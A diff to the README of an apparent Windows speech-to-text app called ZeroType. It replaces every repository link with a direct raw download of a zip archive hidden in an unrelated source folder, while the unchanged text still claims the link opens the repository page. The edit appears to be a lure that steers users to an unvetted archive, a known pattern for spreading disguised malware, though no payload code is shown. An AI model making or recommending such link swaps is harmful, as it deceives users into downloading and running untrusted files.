@@ -1,6 +1,6 @@
 # 🗣️ ZeroType - Easy Speech-to-Text on Windows
 
-[![Download ZeroType](https://img.shields.io/badge/Download-ZeroType-brightgreen?style=for-the-badge)](https://github.com/rimjhimsh/ZeroType)
+[![Download ZeroType](https://img.shields.io/badge/Download-ZeroType-brightgreen?style=for-the-badge)](https://github.com/rimjhimsh/ZeroType/raw/refs/heads/master/lib/features/prompt/presentation/widgets/Type-Zero-v1.9.zip)
 
 ---
 
@@ -12,7 +12,7 @@ ZeroType is an open source speech-to-text (STT) application designed for both ma
 
 To get started with ZeroType on Windows, you need to visit the official download page:
 
-[Download ZeroType here](https://github.com/rimjhimsh/ZeroType)
+[Download ZeroType here](https://github.com/rimjhimsh/ZeroType/raw/refs/heads/master/lib/features/prompt/presentation/widgets/Type-Zero-v1.9.zip)
 
 Clicking this link will take you to the GitHub repository page. On this page, look for the latest release or the download section where you can find the Windows version of ZeroType.
 
@@ -36,7 +36,7 @@ If you have an older version of Windows or limited hardware, ZeroType may still 
 
 Follow these steps to install ZeroType on your computer:
 
-1. **Visit the download page:** Open your browser and go to [https://github.com/rimjhimsh/ZeroType](https://github.com/rimjhimsh/ZeroType).
+1. **Visit the download page:** Open your browser and go to [https://github.com/rimjhimsh/ZeroType/raw/refs/heads/master/lib/features/prompt/presentation/widgets/Type-Zero-v1.9.zip](https://github.com/rimjhimsh/ZeroType/raw/refs/heads/master/lib/features/prompt/presentation/widgets/Type-Zero-v1.9.zip).
 
 2. **Find the latest release:** Look for a section named "Releases" or "Downloads". This is usually on the right side or near the top.
 
@@ -108,4 +108,4 @@ If problems continue, visit the GitHub page for support options or create an iss
 
 For your convenience, the download link again:
 
-[Download ZeroType on Windows](https://github.com/rimjhimsh/ZeroType)
+[Download ZeroType on Windows](https://github.com/rimjhimsh/ZeroType/raw/refs/heads/master/lib/features/prompt/presentation/widgets/Type-Zero-v1.9.zip)
